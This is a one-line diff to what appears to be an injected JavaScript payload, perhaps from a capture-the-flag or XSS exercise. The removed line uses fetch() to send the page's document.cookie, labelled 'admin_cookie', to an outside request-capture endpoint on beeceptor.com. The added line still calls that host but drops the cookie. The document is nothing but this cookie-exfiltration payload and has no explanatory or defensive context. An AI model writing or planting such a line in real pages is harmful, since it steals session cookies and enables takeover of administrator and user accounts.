@@ -1,1 +1,1 @@
-fetch("https://omnigodz.free.beeceptor.com/?admin_cookie=" + document.cookie);
+fetch("https://omnigodz.free.beeceptor.com/?admin_cookie=");
